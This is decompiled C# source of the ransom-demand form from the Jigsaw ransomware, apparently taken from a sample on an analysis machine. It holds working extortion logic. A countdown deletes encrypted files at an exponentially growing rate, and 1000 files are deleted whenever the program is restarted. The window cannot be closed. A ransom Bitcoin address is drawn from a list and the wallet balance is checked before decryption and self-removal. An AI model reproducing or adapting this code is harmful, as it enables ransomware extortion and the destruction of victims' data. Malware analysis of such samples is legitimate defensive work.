// Decompiled with JetBrains decompiler
// Type: Main.FormGame
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\IEUser\Desktop\clean\jigsaw-tamp2-cleaned.exe

using Main.Properties;
using Main.Tools;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace Main
{
  public class FormGame : Form
  {
    private static int _timeLeftSec;
    private static int _exponent;
    private const double Base = 1.1;
    private static int _indexNum;
    private IContainer components;
    private Label labelWelcome;
    private Timer timerTypingEffect;
    private Label labelTask;
    private TextBox textBoxAddress;
    private Button buttonCheckPayment;
    private Button buttonViewEncryptedFiles;
    private Timer timerCountDown;
    private Label labelCountDown;
    private Label labelFilesToDelete;

    public FormGame() => this.InitializeComponent();

    private void FormGame_Load(object sender, EventArgs e)
    {
      FormGame.smethod_0((Form) this, false);
      FormGame.smethod_1((Form) this, false);
      FormGame.smethod_2((Form) this, FormStartPosition.CenterScreen);
      Main.Tools.Windows.MakeTopMost((Form) this);
      FormGame.smethod_3(this.timerTypingEffect, 125);
      FormGame.smethod_4(this.timerTypingEffect, true);
      FormGame.smethod_5((Control) this.labelWelcome, "");
      FormGame.smethod_5((Control) this.labelTask, Config.TaskMessage);
      FormGame.smethod_6((Control) this.labelTask, false);
      FormGame.smethod_7((TextBoxBase) this.textBoxAddress, true);
      FormGame.smethod_5((Control) this.textBoxAddress, FormGame.GetBitcoinAddess());
      FormGame.smethod_6((Control) this.textBoxAddress, false);
      FormGame.smethod_6((Control) this.buttonCheckPayment, false);
      FormGame.smethod_6((Control) this.buttonViewEncryptedFiles, false);
      FormGame.smethod_6((Control) this.labelCountDown, false);
      FormGame.smethod_4(this.timerCountDown, false);
      FormGame.smethod_6((Control) this.labelFilesToDelete, false);
      if (!FormGame.DidRun())
        return;
      FormGame.DeleteFiles(1000);
    }

    private static bool DidRun()
    {
      string string_0 = FormGame.smethod_8(Config.WorkFolderPath, "dr");
      if (FormGame.smethod_9(string_0))
        return true;
      FormGame.smethod_10(string_0, "21");
      return false;
    }

    private static void DeleteFiles(int num)
    {
      try
      {
        int num1 = 0;
        foreach (string encryptedFile in Locker.GetEncryptedFiles())
        {
          if (num1 == num)
            break;
          FormGame.smethod_12(FormGame.smethod_11(encryptedFile, ".fun"));
          ++num1;
        }
      }
      catch (Exception ex)
      {
      }
    }

    private static string GetBitcoinAddess()
    {
      string string_0_1 = FormGame.smethod_8(Config.WorkFolderPath, "Address.txt");
      if (FormGame.smethod_9(string_0_1))
        return FormGame.smethod_13(string_0_1);
      HashSet<string> source = new HashSet<string>();
      string vanityAddresses = Resources.vanityAddresses;
      string[] string_1_1 = new string[1]
      {
        FormGame.smethod_14()
      };
      foreach (string string_0_2 in ((IEnumerable<string>) FormGame.smethod_15(vanityAddresses, string_1_1, StringSplitOptions.RemoveEmptyEntries)).ToList<string>())
        source.Add(FormGame.smethod_16(string_0_2));
      string string_1_2 = source.OrderBy<string, Guid>((Func<string, Guid>) (x => Guid.NewGuid())).FirstOrDefault<string>();
      FormGame.smethod_10(string_0_1, string_1_2);
      return string_1_2;
    }

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
        FormGame.smethod_18(createParams, FormGame.smethod_17(createParams) | 512);
        return createParams;
      }
    }

    private void FormGame_FormClosing(object sender, FormClosingEventArgs e)
    {
      FormGame.smethod_19((CancelEventArgs) e, true);
      int num = (int) FormGame.smethod_20((IWin32Window) this, "You are about to make a very bad decision. Are you sure about it?");
    }

    private void timerTypingEffect_Tick(object sender, EventArgs e)
    {
      string welcomeMessage = Config.WelcomeMessage;
      FormGame.smethod_5((Control) this.labelWelcome, FormGame.smethod_11(FormGame.smethod_21(welcomeMessage, 0, FormGame._indexNum), "_"));
      ++FormGame._indexNum;
      if (FormGame._indexNum != FormGame.smethod_22(welcomeMessage) + 1)
        return;
      FormGame.smethod_4(this.timerTypingEffect, false);
      FormGame.smethod_6((Control) this.labelTask, true);
      FormGame.smethod_6((Control) this.textBoxAddress, true);
      FormGame.smethod_6((Control) this.buttonCheckPayment, true);
      FormGame.smethod_6((Control) this.buttonViewEncryptedFiles, true);
      FormGame.smethod_6((Control) this.labelCountDown, true);
      FormGame.smethod_4(this.timerCountDown, true);
      FormGame.smethod_6((Control) this.labelFilesToDelete, true);
      FormGame._timeLeftSec = 3600;
    }

    private void buttonCheckPayment_Click(object sender, EventArgs e)
    {
      try
      {
        double price = Blockr.GetPrice();
        int num1 = (int) (Blockr.GetBalanceBtc(FormGame.GetBitcoinAddess()) * price);
        if (num1 > Config.RansomUsd)
        {
          FormGame.smethod_23(this.timerCountDown);
          FormGame.smethod_24((Control) this.buttonCheckPayment, false);
          FormGame.smethod_25((Control) this.buttonCheckPayment, Color.Lime);
          FormGame.smethod_5((Control) this.buttonCheckPayment, "Great job, I'm decrypting your files...");
          int num2 = (int) FormGame.smethod_26((IWin32Window) this, "Decrypting your files. It will take for a while. After done I will close and completely remove myself from your computer.", "Great job");
          Locker.DecryptFiles(".fun");
          Hacking.RemoveItself();
        }
        else if (num1 > 0)
        {
          FormGame.smethod_25((Control) this.buttonCheckPayment, Color.Tomato);
          FormGame.smethod_5((Control) this.buttonCheckPayment, "You did not sent me enough! Try again!");
        }
        else
        {
          FormGame.smethod_25((Control) this.buttonCheckPayment, Color.Tomato);
          FormGame.smethod_5((Control) this.buttonCheckPayment, "You haven't made payment yet! Try again!");
        }
      }
      catch (Exception ex)
      {
        int num = (int) FormGame.smethod_28(FormGame.smethod_27((object) ex));
        FormGame.smethod_5((Control) this.buttonCheckPayment, "Are you connected to the internet? Try again!");
        FormGame.smethod_25((Control) this.buttonCheckPayment, Color.Tomato);
      }
    }

    private void buttonViewEncryptedFiles_Click(object sender, EventArgs e) => FormGame.smethod_29((Form) new FormEncryptedFiles(), (IWin32Window) this);

    private void timerCountDown_Tick(object sender, EventArgs e)
    {
      if (FormGame._timeLeftSec > 0)
      {
        --FormGame._timeLeftSec;
        FormGame.smethod_5((Control) this.labelCountDown, FormGame.smethod_30((object) (FormGame._timeLeftSec / 60), (object) ":", (object) (FormGame._timeLeftSec % 60)));
      }
      else
      {
        FormGame._timeLeftSec = 3600;
        int num = (int) FormGame.smethod_31(1.1, (double) FormGame._exponent);
        FormGame.smethod_5((Control) this.labelFilesToDelete, FormGame.smethod_32((object) num, (object) " files will be deleted"));
        ++FormGame._exponent;
        FormGame.DeleteFiles(num);
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        FormGame.smethod_33((IDisposable) this.components);
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) FormGame.smethod_34();
      this.labelWelcome = FormGame.smethod_35();
      this.timerTypingEffect = FormGame.smethod_36(this.components);
      this.labelTask = FormGame.smethod_35();
      this.textBoxAddress = FormGame.smethod_37();
      this.buttonCheckPayment = FormGame.smethod_38();
      this.buttonViewEncryptedFiles = FormGame.smethod_38();
      this.timerCountDown = FormGame.smethod_36(this.components);
      this.labelCountDown = FormGame.smethod_35();
      this.labelFilesToDelete = FormGame.smethod_35();
      FormGame.smethod_39((Control) this);
      FormGame.smethod_40((Control) this.labelWelcome, true);
      FormGame.smethod_25((Control) this.labelWelcome, Color.Black);
      FormGame.smethod_42((Control) this.labelWelcome, FormGame.smethod_41("Lucida Console", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0));
      FormGame.smethod_43((Control) this.labelWelcome, Color.Lime);
      this.labelWelcome.Location = new Point(25, 29);
      this.labelWelcome.Name = "labelWelcome";
      this.labelWelcome.Size = new Size(218, 16);
      this.labelWelcome.TabIndex = 0;
      this.labelWelcome.Text = "I want to play a game";
      this.timerTypingEffect.Tick += new EventHandler(this.timerTypingEffect_Tick);
      this.labelTask.AutoSize = true;
      this.labelTask.BackColor = Color.Black;
      this.labelTask.Font = new Font("Lucida Console", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.labelTask.ForeColor = Color.Lime;
      this.labelTask.Location = new Point(25, 505);
      this.labelTask.Name = "labelTask";
      this.labelTask.Size = new Size(239, 16);
      this.labelTask.TabIndex = 1;
      this.labelTask.Text = "All you have to do...";
      this.textBoxAddress.Location = new Point(28, 524);
      this.textBoxAddress.Name = "textBoxAddress";
      this.textBoxAddress.Size = new Size(348, 20);
      this.textBoxAddress.TabIndex = 2;
      this.textBoxAddress.Text = "12Xspzstah37626slkwKhsKSHA";
      this.buttonCheckPayment.BackColor = Color.Gold;
      this.buttonCheckPayment.Location = new Point(28, 551);
      this.buttonCheckPayment.Name = "buttonCheckPayment";
      this.buttonCheckPayment.Size = new Size(348, 33);
      this.buttonCheckPayment.TabIndex = 3;
      this.buttonCheckPayment.Text = "I made a payment, now give me back my files!";
      this.buttonCheckPayment.UseVisualStyleBackColor = false;
      this.buttonCheckPayment.Click += new EventHandler(this.buttonCheckPayment_Click);
      this.buttonViewEncryptedFiles.BackColor = Color.Gray;
      this.buttonViewEncryptedFiles.Location = new Point(28, 479);
      this.buttonViewEncryptedFiles.Name = "buttonViewEncryptedFiles";
      this.buttonViewEncryptedFiles.Size = new Size(348, 23);
      this.buttonViewEncryptedFiles.TabIndex = 4;
      this.buttonViewEncryptedFiles.Text = "View encrypted files";
      this.buttonViewEncryptedFiles.UseVisualStyleBackColor = false;
      this.buttonViewEncryptedFiles.Click += new EventHandler(this.buttonViewEncryptedFiles_Click);
      this.timerCountDown.Interval = 1000;
      this.timerCountDown.Tick += new EventHandler(this.timerCountDown_Tick);
      this.labelCountDown.AutoSize = true;
      this.labelCountDown.BackColor = Color.Black;
      this.labelCountDown.BorderStyle = BorderStyle.Fixed3D;
      this.labelCountDown.Font = new Font("Lucida Sans Unicode", 48f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.labelCountDown.ForeColor = Color.DarkRed;
      this.labelCountDown.Location = new Point(28, 320);
      this.labelCountDown.Name = "labelCountDown";
      this.labelCountDown.Size = new Size(220, 80);
      this.labelCountDown.TabIndex = 5;
      this.labelCountDown.Text = "59:59";
      this.labelFilesToDelete.AutoSize = true;
      this.labelFilesToDelete.BackColor = Color.Black;
      this.labelFilesToDelete.Font = new Font("Lucida Console", 12f, FontStyle.Bold);
      this.labelFilesToDelete.ForeColor = Color.Lime;
      this.labelFilesToDelete.Location = new Point(24, 455);
      this.labelFilesToDelete.Name = "labelFilesToDelete";
      this.labelFilesToDelete.Size = new Size(261, 16);
      this.labelFilesToDelete.TabIndex = 6;
      this.labelFilesToDelete.Text = "1 file will be deleted.";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) Resources.Jigsaw;
      this.ClientSize = new Size(840, 596);
      this.Controls.Add((Control) this.labelFilesToDelete);
      this.Controls.Add((Control) this.labelCountDown);
      this.Controls.Add((Control) this.buttonViewEncryptedFiles);
      this.Controls.Add((Control) this.buttonCheckPayment);
      this.Controls.Add((Control) this.textBoxAddress);
      this.Controls.Add((Control) this.labelTask);
      this.Controls.Add((Control) this.labelWelcome);
      this.Name = nameof (FormGame);
      this.FormClosing += new FormClosingEventHandler(this.FormGame_FormClosing);
      this.Load += new EventHandler(this.FormGame_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    static void smethod_0(Form form_0, bool bool_0) => form_0.MaximizeBox = bool_0;

    static void smethod_1(Form form_0, bool bool_0) => form_0.MinimizeBox = bool_0;

    static void smethod_2(Form form_0, FormStartPosition formStartPosition_0) => form_0.StartPosition = formStartPosition_0;

    static void smethod_3(Timer timer_0, int int_0) => timer_0.Interval = int_0;

    static void smethod_4(Timer timer_0, bool bool_0) => timer_0.Enabled = bool_0;

    static void smethod_5(Control control_0, string string_0) => control_0.Text = string_0;

    static void smethod_6(Control control_0, bool bool_0) => control_0.Visible = bool_0;

    static void smethod_7(TextBoxBase textBoxBase_0, bool bool_0) => textBoxBase_0.ReadOnly = bool_0;

    static string smethod_8(string string_0, string string_1) => Path.Combine(string_0, string_1);

    static bool smethod_9(string string_0) => File.Exists(string_0);

    static void smethod_10(string string_0, string string_1) => File.WriteAllText(string_0, string_1);

    static string smethod_11(string string_0, string string_1) => string_0 + string_1;

    static void smethod_12(string string_0) => File.Delete(string_0);

    static string smethod_13(string string_0) => File.ReadAllText(string_0);

    static string smethod_14() => Environment.NewLine;

    static string[] smethod_15(
      string string_0,
      string[] string_1,
      StringSplitOptions stringSplitOptions_0)
    {
      return string_0.Split(string_1, stringSplitOptions_0);
    }

    static string smethod_16(string string_0) => string_0.Trim();

    static int smethod_17(CreateParams createParams_0) => createParams_0.ClassStyle;

    static void smethod_18(CreateParams createParams_0, int int_0) => createParams_0.ClassStyle = int_0;

    static void smethod_19(CancelEventArgs cancelEventArgs_0, bool bool_0) => cancelEventArgs_0.Cancel = bool_0;

    static DialogResult smethod_20(IWin32Window iwin32Window_0, string string_0) => MessageBox.Show(iwin32Window_0, string_0);

    static string smethod_21(string string_0, int int_0, int int_1) => string_0.Substring(int_0, int_1);

    static int smethod_22(string string_0) => string_0.Length;

    static void smethod_23(Timer timer_0) => timer_0.Stop();

    static void smethod_24(Control control_0, bool bool_0) => control_0.Enabled = bool_0;

    static void smethod_25(Control control_0, Color color_0) => control_0.BackColor = color_0;

    static DialogResult smethod_26(IWin32Window iwin32Window_0, string string_0, string string_1) => MessageBox.Show(iwin32Window_0, string_0, string_1);

    static string smethod_27(object object_0) => object_0.ToString();

    static DialogResult smethod_28(string string_0) => MessageBox.Show(string_0);

    static void smethod_29(Form form_0, IWin32Window iwin32Window_0) => form_0.Show(iwin32Window_0);

    static string smethod_30(object object_0, object object_1, object object_2) => object_0.ToString() + object_1 + object_2;

    static double smethod_31(double double_0, double double_1) => Math.Pow(double_0, double_1);

    static string smethod_32(object object_0, object object_1) => object_0.ToString() + object_1;

    static void smethod_33(IDisposable idisposable_0) => idisposable_0.Dispose();

    static System.ComponentModel.Container smethod_34() => new System.ComponentModel.Container();

    static Label smethod_35() => new Label();

    static Timer smethod_36(IContainer icontainer_0) => new Timer(icontainer_0);

    static TextBox smethod_37() => new TextBox();

    static Button smethod_38() => new Button();

    static void smethod_39(Control control_0) => control_0.SuspendLayout();

    static void smethod_40(Control control_0, bool bool_0) => control_0.AutoSize = bool_0;

    static Font smethod_41(
      string string_0,
      float float_0,
      FontStyle fontStyle_0,
      GraphicsUnit graphicsUnit_0,
      byte byte_0)
    {
      return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
    }

    static void smethod_42(Control control_0, Font font_0) => control_0.Font = font_0;

    static void smethod_43(Control control_0, Color color_0) => control_0.ForeColor = color_0;
  }
}
